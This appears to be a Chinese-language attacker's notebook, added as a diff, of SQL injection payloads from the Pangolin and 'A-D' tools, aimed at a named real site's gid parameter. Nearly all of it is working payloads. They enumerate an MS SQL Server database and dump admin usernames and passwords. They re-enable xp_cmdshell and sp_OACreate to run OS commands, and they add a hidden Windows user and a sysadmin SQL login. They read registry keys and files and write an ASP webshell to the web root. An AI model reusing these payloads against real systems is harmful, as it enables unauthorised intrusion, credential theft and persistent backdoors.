@@ -1,0 +1,371 @@
+http://www.bitland.com.cn/ch/User_GoodsInfo.aspx?gid=167  字符型
+=================================================================
+			pangolin语句:
+=================================================================
+
+
+判断数据用户权限：及注入类型
+             /ch/User_GoodsInfo.aspx?gid=167%20and%20user=0  或:  %20and%20user=0--
+             /ch/User_GoodsInfo.aspx?gid=167'%20and%20user=0 或： '%20and%20user=0--
+
+判断版本：  /ch/User_GoodsInfo.aspx?gid=167'%20and%20(select%20@@VERSION)%3E0--
+
+判断数据库名：            '%20and%20db_name()=0--
+爆主机名：
+                       '%20and%20host_name()=0--
+                       '%20and%20@@servername=0--
+
+数据库系统启动用户权限：'%20and%20system_user=0--
+
+数据库操作权限：
+     gid=167'%20and%20cast(is_srvrolemember(0x730079007300610064006d0069006e00)%20as%20nvarchar(1))%2bchar(124)=1--
+  
+0x730079007300610064006d0069006e00为sql_en编码:sysadmin
+
+爆数据库名和、文件名及路经：
+  '%20and%200=(select%20top%201%20cast([name]%20as%20nvarchar(256))%2bchar(94)%2bcast([filename]%20as%20nvarchar(256))%20from(select%20top%20%201%20dbid,name,filename%20from%20[master].[dbo].[sysdatabases]%20order%20by%20[dbid])%20t%20order%20by%20[dbid]%20desc)--   //** master
+
+  '%20and%200=(select%20top%201%20cast([name]%20as%20nvarchar(256))%2bchar(94)%2bcast([filename]%20as%20nvarchar(256))%20from(select%20top%20%202%20dbid,name,filename%20from%20[master].[dbo].[sysdatabases]%20order%20by%20[dbid])%20t%20order%20by%20[dbid]%20desc)--   bdid=2的数据库的数据文件*.mdf
+
+爆盘符：--------
+先删表为后面建面不会重名:'%20;drop%20table%20pangolin_test_table;--
+
+建表：                   '%20;create%20table%20pangolin_test_table(name%20nvarchar(255),low%20nvarchar(255),high%20nvarchar(255),type%20nvarchar(255));--
+
+插入查询数据：（盘符）  '%20;insert%20pangolin_test_table%20exec%20master.dbo.xp_availablemedia;--  插入数据时什么提示有末闭合'
+ 
+                       '%20and%200=(select%20top%201%20cast([name]%20as%20nvarchar(4000))%2bchar(94)%2bcast([type]%20as%20nvarchar(4000))%20from(select%20top%20%201%20[name],[low],[high],[type]%20from%20pangolin_test_table%20group%20by%20[name],[low],[high],[type]%20order%20by%20[name])%20t%20order%20by%20[name]%20desc)--
+ 读出记录：            '%20and%200=(select%20top%201%20cast([name]%20as%20nvarchar(4000))%2bchar(94)%2bcast([type]%20as%20nvarchar(4000))%20from(select%20top%20%203%20[name],[low],[high],[type]%20from%20pangolin_test_table%20group%20by%20[name],[low],[high],[type]%20order%20by%20[name])%20t%20order%20by%20[name]%20desc)--  top N
+
+爆系统用户组：
+建表：    '%20;create%20table%20pangolin_test_table(name%20nvarchar(255),description%20nvarchar(4000));-- 
+插入数据：'%20;insert%20pangolin_test_table%20exec%20master.dbo.xp_enumgroups;-- 
+读出数据：'%20and%200=(select%20top%201%20cast([name]%20as%20nvarchar(4000))%2bchar(94)%2bcast([description]%20as%20nvarchar(4000))%20from(select%20top%20%201%20[name],[description]%20from%20pangolin_test_table%20group%20by%20[name],[description]%20order%20by%20[name])%20t%20order%20by%20[name]%20desc)----
+
+爆表：
+
+表数量：'%20and%20(select%20cast(count(1)%20as%20varchar(10))%2bchar(94)%20from%20[sysobjects]%20where%20xtype=char(85)%20and%20status!=0)=0-- 
+
+爆表名：'%20and%20(select%20top%201%20cast(name%20as%20varchar(256))%20from(select%20top%201%20id,name%20from%20[sysobjects]%20where%20xtype=char(85)%20and%20status!=0%20order%20by%20id)%20t%20order%20by%20id%20desc)=0--  改后面的top N
+
+爆列名：
+  先爆出表的id：'%20and%20(select%20top%201%20cast(id%20as%20nvarchar(20))%2bchar(124)%20%20from%20[sysobjects]%20where%20name=0x610064006d0069006e00)=0--   0x610064006d0069006e00=admin  得到的id=629577281
+列数目：'%20and%20(select%20cast(count(1)%20as%20varchar(10))%2bchar(94)%20from%20[syscolumns]%20where%20id=629577281)=0--  
+
+爆列名：'%20and%20(select%20top%201%20cast(name%20as%20varchar(8000))%20from%20(select%20top%201%20colid,name%20from%20[syscolumns]%20where%20id=629577281%20order%20by%20colid)%20t%20order%20by%20colid%20desc)=0--
+
+列中的记录条数：'%20and%20(select%20cast(count(1)%20as%20varchar(8000))%2bchar(94)%20from%20[admin]%20where%201=1)=0-- 
+记录内容：      '%20and%20(select%20top%201%20isnull(cast([id]%20as%20nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([admin]%20as%20nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([pwd]%20as%20nvarchar(4000)),char(32))%20from%20[admin]%20where%201=1%20order%20by%20[id])=0--
+not in 法爆其他记录：
+'%20and%20(select%20top%201%20isnull(cast([id]%20as%20nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([admin]%20as%20nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([pwd]%20as%20nvarchar(4000)),char(32))%20from%20[admin]%20where%201=1%20and%20id%20not%20in%20(select%20top%201%20id%20from%20[admin]%20where%201=1%20order%20by%20[id])%20)=0--
+'%20and%20(select%20top%201%20isnull(cast([id]%20as%20nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([admin]%20as%20nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([pwd]%20as%20nvarchar(4000)),char(32))%20from%20[admin]%20where%201=1%20and%20id%20not%20in%20(select%20top%202%20id%20from%20[admin]%20where%201=1%20order%20by%20[id])%20)=0--   not in top N
+
+xp_cmdshell:     xp_cmdshell=0x780070005f0063006d0064007300680065006c006c00
+恢复xp_cmdshell: '%20;exec%20master.dbo.sp_addextendedproc%200x780070005f0063006d0064007300680065006c006c00,%200x780070006c006f006700370030002e0064006c006c00--  xplog70.dll=0x780070006c006f006700370030002e0064006c006c00
+恢复sp_OACreate: '%20;exec%20master.dbo.sp_addextendedproc%200x730070005f004f004100430072006500610074006500,%200x780070006c006f006700370030002e0064006c006c00--  sp_OACreate=0x730070005f004f004100430072006500610074006500
+
+net   user:
+册表->建表->插入数据->读出=>
+册表:  '%20;drop%20table%20[pangolin_test_table];--
+建表:  '%20;create%20table%20[pangolin_test_table]([resulttxt]%20nvarchar(4000)%20null);-- 
+插入数据:  '%20;declare%20@z%20nvarchar(4000)%20set%20@z=0x6e006500740020007500730065007200%20insert%20into%20[pangolin_test_table](resulttxt)%20exec%20master.dbo.xp_cmdshell%20@z;alter%20table%20[pangolin_test_table]%20add%20id%20int%20not%20null%20identity%20(1,1)--   会报错：各表中的列名必须唯一。在表 'pangolin_test_table' 中多次指定了列名 set%20@z='net user'=0x6e006500740020007500730065007200
+字符数:     '%20and%20(select%20cast(count(1)%20as%20varchar(8000))%2bchar(94)%20from%20[数据库名]..[pangolin_test_table])=0---
+读出:   
+      '%20and%20(select%20top%201%20case%20when%20resulttxt%20is%20null%20then%20char(124)%20else%20resulttxt%2bchar(124)%20end%20from%20(select%20top%2014%20[id],[resulttxt]%20from%20[pangolin_test_table]%20order%20by%20[id])%20t%20order%20by%20[id]%20desc)=0--  
+      '%20and%20(select%20top%201%20case%20when%20resulttxt%20is%20null%20then%20char(124)%20else%20resulttxt%2bchar(124)%20end%20from%20(select%20top%2018%20[id],[resulttxt]%20from%20[pangolin_test_table]%20order%20by%20[id])%20t%20order%20by%20[id]%20desc)=0---   top N 
+set @z=命令变量就行
+net user go$ yanhua /add  '%20;declare%20@z%20nvarchar(4000)%20set%20@z=0x6E006500740020007500730065007200200067006F0024002000790061006E0068007500610020002F00610064006400%20insert%20into%20[pangolin_test_table](resulttxt)%20exec%20master.dbo.xp_cmdshell%20@z;alter%20table%20[pangolin_test_table]%20add%20id%20int%20not%20null%20identity%20(1,1)--
+net user go$ yanhua /add=0x6E006500740020007500730065007200200067006F0024002000790061006E0068007500610020002F00610064006400
+
+sp_oacreate执行命令：
+册表->建表->插入数据->读出=>
+'%20;create%20table%20[pangolin_test_table]([resulttxt]%20nvarchar(4000)%20null);-- 
+
+设置命令变量：'%20;declare%20@wscript_shell%20nvarchar(100)%20set%20@wscript_shell=wscript.shell%20declare%20@run%20nvarchar(50)%20set%20@run=0x720075006e00%20declare%20@cmd%20nvarchar(4000)%20set%20@cmd=cmd /c ver > %WINDIR%\tasks\pangolin_test_table.tmp%20declare%20@o%20int%20exec%20sp_oacreate%20@wscript_shell,@o%20out%20exec%20sp_oamethod%20@o,@run,null,@cmd,0,true-- 
+  如：  ver   aspx?gid=167'%20;declare%20@wscript_shell%20nvarchar(100)%20set%20@wscript_shell=0x77007300630072006900700074002e007300680065006c006c00%20declare%20@run%20nvarchar(50)%20set%20@run=0x720075006e00%20declare%20@cmd%20nvarchar(4000)%20set%20@cmd=0x63006d00640020002f006300200076006500720020003e0020002500570049004e0044004900520025005c007400610073006b0073005c00700061006e0067006f006c0069006e005f0074006500730074005f007400610062006c0065002e0074006d007000%20declare%20@o%20int%20exec%20sp_oacreate%20@wscript_shell,@o%20out%20exec%20sp_oamethod%20@o,@run,null,@cmd,0,true-- 
+              会提示："字符串 ' ;declare @wscript_shell nvarchar(100) set @wscript_shell=0x7700730........."
+插入:   '%20;bulk%20insert%20pangolin_test_table%20from%20'c:%5Cwinnt%5Ctasks%5Cpangolin_test_table.tmp'%20with%20(keepnulls);alter%20table%20[pangolin_test_table]%20add%20id%20int%20not%20null%20identity%20(1,1)--   win2000
+插入:   '%20;bulk%20insert%20pangolin_test_table%20from%20'c:%5Cwindows%5Ctasks%5Cpangolin_test_table.tmp'%20with%20(keepnulls);alter%20table%20[pangolin_test_table]%20add%20id%20int%20not%20null%20identity%20(1,1)-- win03  提示:大容量插入: 在数据文件中遇到意外的文件结尾 (EOF)。 
+插入：  ' ;declare @o int exec sp_oacreate 0x77007300630072006900700074002e007300680065006c006c00,@o out exec sp_oamethod @o,0x720075006e00,null,0x63006d00640020002f0063002000640065006c0020002500570049004e0044004900520025005c007400610073006b0073005c00700061006e0067006f006c0069006e005f0074006500730074005f007400610062006c0065002e0074006d007000,0,true--' 之前有未闭合的引号。 插入到记录中；
+
+
+读记录数：'%20and%20(select%20cast(count(1)%20as%20varchar(8000))%2bchar(94)%20from%20[数据库]..[pangolin_test_table])=0---
+第一条：
+'%20and%20(select%20top%201%20case%20when%20resulttxt%20is%20null%20then%20char(124)%20else%20resulttxt%2bchar(124)%20end%20from%20(select%20top%201%20id,resulttxt%20from%20[pangolin_test_table]%20order%20by%20[id])%20t%20order%20by%20[id]%20desc)=0---  和xp_cmdshell一样 改top N一直读；
+
+'%20;declare%20@o%20int%20exec%20sp_oacreate%200x77007300630072006900700074002e007300680065006c006c00,@o%20out%20exec%20sp_oamethod%20@o,0x720075006e00,null,0x63006d00640020002f0063002000640065006c0020002500570049004e0044004900520025005c007400610073006b0073005c00700061006e0067006f006c0069006e005f0074006500730074005f007400610062006c0065002e0074006d007000,0,true-- 
+
+执行sp_makewebtask备份web:
+'%20;declare%20@s%20nvarchar(4000);select%20@s=0x730065006c00650063007400200027003c00250045007800650063007500740065002800720065007100750065007300740028002200610022002900290025003e000d000a002700;exec%20sp_makewebtask%200x43003a005c0049006e00650074007000750062005c0077007700770072006f006f0074005c00700061006e0067006f006c0069006e002e00610073007000,%20@s;-- 
+@S=select '<%Execute(request("a"))%>
+C:\Inetpub\wwwroot\pangolin.asp
+---------------------------------
+读注册表值：
+册表->建表->插入数据->读出=>
+'%20;drop%20table%20[pangolin_test_table];--
+'%20;create%20table%20[pangolin_test_table]([a]%20nvarchar(4000)%20null);-- 
+'%20;declare%20@s%20nvarchar(4000)%20exec%20master.dbo.xp_regread%200x484b45595f4c4f43414c5f4d414348494e45,0x534f4654574152455c4d6963726f736f66745c57696e646f7773204e545c43757272656e7456657273696f6e5c57696e6c6f676f6e,%200x44656661756c74557365724e616d65,%20@s%20output%20insert%20into%20pangolin_test_table%20(a)%20values(@s);--
+'%20and%20(select%20top%201%20a%20from%20pangolin_test_table)=0-
+
+读目录：
+册表->建表->插入数据->读出=>
+'%20;drop%20table%20pangolin_test_table;--
+'%20;create%20table%20pangolin_test_table([id]%20[int]%20identity%20(1,1)%20not%20null,[name]%20[nvarchar]%20(300)%20not%20null,[depth]%20[int]%20not%20null,[isfile]%20[nvarchar]%20(50)%20null);-- 
+'%20;declare%20@z%20nvarchar(4000)%20set%20@z=0x63003a005c00%20insert%20pangolin_test_table%20execute%20master..xp_dirtree%20@z,1,1--            0x63003a005c00=C:\
+记录数目：ch/User_GoodsInfo.aspx?gid=167'%20and%20(select%20cast(count(1)%20as%20varchar(8000))%2bchar(94)%20from%20pangolin_test_table)=0--
+读出表：
+ch/User_GoodsInfo.aspx?gid=167'%20and%200=(select%20top%201%20cast([isfile]%20as%20nvarchar(4000))%2bchar(94)%2bcast([name]%20as%20nvarchar(4000))%20from%20(select%20distinct%20top%20%201%20[name],[isfile]%20from%20pangolin_test_table%20group%20by%20[name],[isfile]%20order%20by%20[isfile])%20t%20order%20by%20[isfile]%20desc,[name]%20desc)----
+读文件：
+册表->建表->插入数据->读出=>
+'%20;drop%20table%20pangolin_test_table;--
+'%20;create%20table%20pangolin_test_table([id]%20[int]%20identity%20(1,1)%20not%20null,[name]%20[nvarchar]%20(300)%20not%20null,[depth]%20[int]%20not%20null,[isfile]%20[nvarchar]%20(50)%20null);-- 
+插入记录：
+设置变量@z=c:\boot.ini
+'%20;declare%20@z%20nvarchar(4000)%20set%20@z=0x63003A005C0062006F006F0074002E0069006E006900%20insert%20pangolin_test_table%20execute%20master..xp_dirtree%20@z,1,1-- 
+插入变量：读文件变量@=s  /*比读目录多一个变量和读出记录语句不一样，其他一样*/
+'%20;declare%20@s%20varchar(4000)%20set%20@s=cast(0x64726f70207461626c652070616e676f6c696e5f746573745f7461626c653b435245415445205441424c45205b70616e676f6c696e5f746573745f7461626c655d285b526573756c745478745d206e76617263686172283430303029204e554c4c293b62756c6b20696e73657274205b70616e676f6c696e5f746573745f7461626c655d2066726f6d2027633a5c626f6f742e696e69273b416c746572205461626c65205b70616e676f6c696e5f746573745f7461626c655d2061646420696420696e74204e4f54204e554c4c204944454e544954592028312c31293b%20as%20varchar(4000));exec(@s)--
+cast()=do al aglnts_al;RAETBE[aglnts_al][eutx]naca(00 UL;ukisr pnoi_ettbe rm':bo.n'AtrTbe[aglnts_al]adi n O ULIETT 11;
+
+记录数目：
+ch/User_GoodsInfo.aspx?gid=167'%20and%20(select%20cast(count(1)%20as%20varchar(8000))%2bchar(94)%20from%20pangolin_test_table)=0--
+/ch/User_GoodsInfo.aspx?gid=167'%20and%20(select%20cast(count(1)%20as%20varchar(8000))%2bchar(94)%20from%20[bitland]..[pangolin_test_table])=0--
+读出每条：
+ch/User_GoodsInfo.aspx?gid=167'%20and%20(select%20top%201%20case%20when%20resulttxt%20is%20null%20then%20char(124)%20else%20resulttxt%2bchar(124)%20end%20from%20(select%20top%201%20id,resulttxt%20from%20[pangolin_test_table]%20order%20by%20[id])%20t%20order%20by%20[id]%20desc)=0--   top N
+
+
+
+插入一个sa用户：
+ch/User_GoodsInfo.aspx?gid=167'%20;declare%20@s%20varchar(4000)%20set%20@s=cast(0x65786563206D61737465722E64626F2E73705F6164646C6F67696E202779616E68756127%20as%20varchar(4000));exec(@s);--
+cast()=exec master.dbo.sp_addlogin 'yanhua'
+为帐号设置密码：exec master.dbo.sp_password null,'system','yanhua'   /*只要把sql命令设置为@s=命令的16进制就可以,其他命令一样*/
+ch/User_GoodsInfo.aspx?gid=167'%20;declare%20@s%20varchar(4000)%20set%20@s=cast(0x65786563206d61737465722e64626f2e73705f70617373776f7264206e756c6c2c2773797374656d272c2779616e68756127%20as%20varchar(4000));exec(@s);--
+
+提升为system权限：'exec master.dbo.sp_addsrvrolemember sysadmin '用户'
+ch/User_GoodsInfo.aspx?gid=167'%20;declare%20@s%20varchar(4000)%20set%20@s=cast(0x65786563206d61737465722e64626f2e73705f616464737276726f6c656d656d6265722073797361646d696e202773797374656d27%20as%20varchar(4000));exec(@s);--
+
+删了一个用户：
+User_GoodsInfo.aspx?gid=167'%20;declare%20@s%20varchar(4000)%20set%20@s=cast(0x65786563206D61737465722E64626F2E73705F64726F706C6F67696E202761626327%20as%20varchar(4000));exec(@s);--
+cast()=exec master.dbo.sp_droplogin 'abc'
+
+
+http://www.bitland.com.cn/ch/User_GoodsInfo.aspx?gid=167  字符型
+=================================================================
+			啊D注入工具语句:
+
+特点：
+1：打开页面时，会用三种注入类型的（and 1=1 and 1=2）分别去判断每个连接是否可以注入
+2：用+号代替空格
+=================================================================
+存在注入继续：
+原始语句：' and 1=1 and ''='
+ch/User_GoodsInfo.aspx?gid=167'%20%61%6E%64%20%31%3D%31%20and%20''='  如提示语法错误，后面加上--注释
+ch/User_GoodsInfo.aspx?gid=167'%20%61%6E%64%20%31%3D%31%20and%20''='--
+
+当前用户：ch/User_GoodsInfo.aspx?gid=167'%20and%20char(124)%2Buser%2Bchar(124)=0%20and%20''=' 
+          将 nvarchar 值 '|dbo|' 转换为数据类型为 int 的列时发生语法错误
+
+ch/User_GoodsInfo.aspx?gid=167'%20%61%6E%64%20%31%3D%31%20and%20''='
+
+当前数据库名：ch/User_GoodsInfo.aspx?gid=167'%20and%20char(124)%2Bdb_name()%2Bchar(124)=0%20and%20''='
+
+判断权限：
+ch/User_GoodsInfo.aspx?gid=167'%20And%20char(124)%2BCast(IS_SRVROLEMEMBER(0x730079007300610064006D0069006E00)%20as%20varchar(1))%2Bchar(124)=1%20and%20''=' 
+0x730079007300610064006D0069006E00=sysadmin
+判断是否是mssql数据库：
+ch/User_GoodsInfo.aspx?gid=167%20'%20and%20exists%20(select%20*%20from%20sysobjects)%20and%20''=' 
+爆表的数量：
+h/User_GoodsInfo.aspx?gid=167'%20And%20(Select%20char(124)%2BCast(Count(1)%20as%20varchar(8000))%2Bchar(124)%20From%20[sysobjects]%20where%20xtype=char(85)%20and%20status%20>1)>0%20%20and%20''='
+          pangolin语句:      '%20and%20(select%20cast(count(1)%20as%20varchar(10))%2bchar(94)%20from%20[sysobjects]%20where%20xtype=char(85)%20and%20status!=0)=0-- 
+
+爆表名：
+ch/User_GoodsInfo.aspx?gid=167'%20And%20(Select%20Top%201%20char(124)%2Bname%2Bchar(124)%20From%20(Select%20Top%201%20[id],[name]%20From%20[sysobjects]%20where%20xtype=char(85)%20and%20status%20>1%20Order%20by%20[id],[name])%20T%20Order%20by%20[id]%20desc,[name]%20desc)>0%20%20and%20''=' 
+ch/User_GoodsInfo.aspx?gid=167'%20And%20(Select%20Top%201%20char(124)%2Bname%2Bchar(124)%20From%20(Select%20Top%208%20[id],[name]%20From%20[sysobjects]%20where%20xtype=char(85)%20and%20status%20>1%20Order%20by%20[id],[name])%20T%20Order%20by%20[id]%20desc,[name]%20desc)>0%20%20and%20''=' 
+pangolin:                     '%20and%20(select%20top%201%20cast(name%20as%20varchar(256))%20from(select%20top%201%20id,name%20from%20[sysobjects]%20where%20xtype=char(85)%20and%20status!=0%20order%20by%20id)%20t%20order%20by%20id%20desc)=0--
+
+爆列的数量：
+'%20And%20(Select%20char(124)%2BCast(Count(*)%20as%20varchar(8000))%2Bchar(124)%20From%20[bitland]..[syscolumns]%20where%20(id%20=%20(SELECT%20TOP%201%20id%20FROM%20[sysobjects]%20WHERE%20name%20=%20char(97)%2Bchar(100)%2Bchar(109)%2Bchar(105)%2Bchar(110))))>0%20and%20''='    /* name=char(97)%2Bchar(100)%2Bchar(109)%2Bchar(105)%2Bchar(110) 用%2b的url编码来连接几个字符%2b执行时就转换成+号
+'%20and%20(select%20cast(count(1)%20as%20varchar(10))%2bchar(94)%20from%20[syscolumns]%20where%20id=629577281)=0--  
+爆列名：
+'%20And%20(Select%20Top%201%20char(124)%2Bname%2Bchar(124)%20From%20(Select%20Top%201%20[name]%20From%20[syscolumns]%20where%20(id%20=%20(SELECT%20TOP%201%20id%20FROM%20[sysobjects]%20WHERE%20name%20=%20char(97)%2Bchar(100)%2Bchar(109)%2Bchar(105)%2Bchar(110)))%20Order%20by%20[name])%20T%20Order%20by%20[name]%20desc)>0%20and%20''='
+pangolin:
+'%20and%20(select%20top%201%20cast(name%20as%20varchar(8000))%20from%20(select%20top%201%20colid,name%20from%20[syscolumns]%20where%20id=629577281%20order%20by%20colid)%20t%20order%20by%20colid%20desc)=0--
+***************************************************************************************
+pangolin先爆出表的id值：
+啊D中是把爆id值放在了两句中一起
+爆列名：
+  先爆出表的id：'%20and%20(select%20top%201%20cast(id%20as%20nvarchar(20))%2bchar(124)%20%20from%20[sysobjects]%20where%20name=0x610064006d0069006e00)=0--   0x610064006d0069006e00=admin  得到的id=629577281
+列数目：'%20and%20(select%20cast(count(1)%20as%20varchar(10))%2bchar(94)%20from%20[syscolumns]%20where%20id=629577281)=0--  
+pangolin利用colid来爆列名：
+列名：'%20and%20(select%20top%201%20cast(name%20as%20varchar(8000))%20from%20(select%20top%201%20colid,name%20from%20[syscolumns]%20where%20id=629577281%20order%20by%20colid)%20t%20order%20by%20colid%20desc)=0--
+***************************************************************************************
+猜列的内容：
+记录数：
+'%20And%20(Select%20char(124)%2BCast(Count(1)%20as%20varchar(8000))%2Bchar(124)%20From%20[admin]%20where%201=1)>0%20and%20''='
+
+记录内容：
+'%20And%20(Select%20Top%201%20char(124)%2BisNull(cast([admin]%20as%20varchar(8000)),char(32))%2Bchar(124)%2BisNull(cast([class]%20as%20varchar(8000)),char(32))%2Bchar(124)%20From%20(Select%20Top%201%20[admin],[class]%20From%20[admin]%20Where%201=1%20Order%20by%20[admin],[class])%20T%20Order%20by%20[admin]%20desc,[class]%20desc)>0%20and%20''='  top N来逐条爆    
+    
+  isNull(cast([admin]%20as%20varchar(8000))  多个列名用，分开
+pagolin用not in 法爆其他记录;啊D则用top N来逐条爆
+'%20and%20(select%20top%201%20isnull(cast([id]%20as%20nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([admin]%20as%20nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([pwd]%20as%20nvarchar(4000)),char(32))%20from%20[admin]%20where%201=1%20and%20id%20not%20in%20(select%20top%201%20id%20from%20[admin]%20where%201=1%20order%20by%20[id])%20)=0--
+
+爆目录：
+删表建表插入: 
+';DROP%20TABLE%20D99_Tmp;CREATE%20TABLE%20D99_Tmp(subdirectory%20VARCHAR(100),depth%20VARCHAR(100),[file]%20VARCHAR(100))%20%20Insert%20D99_Tmp%20exec%20master..xp_dirtree%20"c:\",%201,1-- 
+';DROP%20TABLE%20D99_Tmp;CREATE%20TABLE%20D99_Tmp(subdirectory%20VARCHAR(100),depth%20VARCHAR(100),[file]%20VARCHAR(100))%20%20Insert%20D99_Tmp%20exec%20master..xp_dirtree%20"c:\Inetpub\",%201,1--
+统计记录数：  '%20And%20(Select%20char(124)%2BCast(Count(1)%20as%20varchar(8000))%2Bchar(124)%20From%20D99_Tmp)=0%20%20and%20''='
+top N法读出： 
+'%20And%20(Select%20Top%201%20char(124)%2BCast([file]%20as%20varchar(8000))%2Bsubdirectory%2Bchar(124)%20From%20(Select%20Top%201%20[subdirectory],[file]%20From%20D99_Tmp%20ORDER%20BY%20[file],[subdirectory])%20D%20ORDER%20BY%20[file]%20desc%20,%20[subdirectory]%20desc)=0%20%20and%20''='
+
+**********************************************************************************
+pangolin:读目录：设置变量来读便于编码
+册表->建表->插入数据->读出=>
+'%20;drop%20table%20pangolin_test_table;--
+'%20;create%20table%20pangolin_test_table([id]%20[int]%20identity%20(1,1)%20not%20null,[name]%20[nvarchar]%20(300)%20not%20null,[depth]%20[int]%20not%20null,[isfile]%20[nvarchar]%20(50)%20null);-- 
+'%20;declare%20@z%20nvarchar(4000)%20set%20@z=0x63003a005c00%20insert%20pangolin_test_table%20execute%20master..xp_dirtree%20@z,1,1--            0x63003a005c00=C:\
+记录数目：ch/User_GoodsInfo.aspx?gid=167'%20and%20(select%20cast(count(1)%20as%20varchar(8000))%2bchar(94)%20from%20pangolin_test_table)=0--
+读出表：
+ch/User_GoodsInfo.aspx?gid=167'%20and%200=(select%20top%201%20cast([isfile]%20as%20nvarchar(4000))%2bchar(94)%2bcast([name]%20as%20nvarchar(4000))%20from%20(select%20distinct%20top%20%201%20[name],[isfile]%20from%20pangolin_test_table%20group%20by%20[name],[isfile]%20order%20by%20[isfile])%20t%20order%20by%20[isfile]%20desc,[name]%20desc)----
+**********************************************************************************
+
+';EXEc%20MaStER..Xp_CmdShell%20'EcHo%20^<html^>^<body^>%20>C:\d99.asp';exec%20master..sp_dropextendedproc%20'xp_cmdshell'--
+
+
+
+
+
+
+pangolin:读文件：
+册表->建表->插入数据->读出=>
+'%20;drop%20table%20pangolin_test_table;--
+'%20;create%20table%20pangolin_test_table([id]%20[int]%20identity%20(1,1)%20not%20null,[name]%20[nvarchar]%20(300)%20not%20null,[depth]%20[int]%20not%20null,[isfile]%20[nvarchar]%20(50)%20null);-- 
+插入记录：
+设置变量@z=c:\boot.ini
+'%20;declare%20@z%20nvarchar(4000)%20set%20@z=0x63003A005C0062006F006F0074002E0069006E006900%20insert%20pangolin_test_table%20execute%20master..xp_dirtree%20@z,1,1-- 
+插入变量：读文件变量@=s  /*比读目录多一个变量和读出记录语句不一样，其他一样*/
+'%20;declare%20@s%20varchar(4000)%20set%20@s=cast(0x64726f70207461626c652070616e676f6c696e5f746573745f7461626c653b435245415445205441424c45205b70616e676f6c696e5f746573745f7461626c655d285b526573756c745478745d206e76617263686172283430303029204e554c4c293b62756c6b20696e73657274205b70616e676f6c696e5f746573745f7461626c655d2066726f6d2027633a5c626f6f742e696e69273b416c746572205461626c65205b70616e676f6c696e5f746573745f7461626c655d2061646420696420696e74204e4f54204e554c4c204944454e544954592028312c31293b%20as%20varchar(4000));exec(@s)--
+cast()=do al aglnts_al;RAETBE[aglnts_al][eutx]naca(00 UL;ukisr pnoi_ettbe rm':bo.n'AtrTbe[aglnts_al]adi n O ULIETT 11;
+
+记录数目：
+ch/User_GoodsInfo.aspx?gid=167'%20and%20(select%20cast(count(1)%20as%20varchar(8000))%2bchar(94)%20from%20pangolin_test_table)=0--
+/ch/User_GoodsInfo.aspx?gid=167'%20and%20(select%20cast(count(1)%20as%20varchar(8000))%2bchar(94)%20from%20[bitland]..[pangolin_test_table])=0--
+读出每条：
+ch/User_GoodsInfo.aspx?gid=167'%20and%20(select%20top%201%20case%20when%20resulttxt%20is%20null%20then%20char(124)%20else%20resulttxt%2bchar(124)%20end%20from%20(select%20top%201%20id,resulttxt%20from%20[pangolin_test_table]%20order%20by%20[id])%20t%20order%20by%20[id]%20desc)=0--   top N
+
+上传文件：
+啊D用xp_cmdshell来echo进去的
+第一步：';EXEc%20MaStER..Xp_CmdShell%20'EcHo%20^<html^>^<body^>%20>C:\d99.asp';exec%20master..sp_dropextendedproc%20'xp_cmdshell'--
+第二步：';use%20master%20dbcc%20addextendedproc('xp_cmdshell','xplog70.dll')-- 
+第三步：';EXEc%20MaStER..Xp_CmdShell%20'EcHo%20^<STYLE%20TYPE=^"text/css^"^>textarea,input,body,select,pre,td,th{font-family:%20^"宋体^";font-size:%209pt}.button%20{border-width:%201px}%20.text%20{border:solid%201px}^</STYLE^>%20>>C:\d99.asp';exec%20master..sp_dropextendedproc%20'xp_cmdshell'--
+再重复二、三步直到传达完.
+
+待续：下次带来个db权限及mysql数据库
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
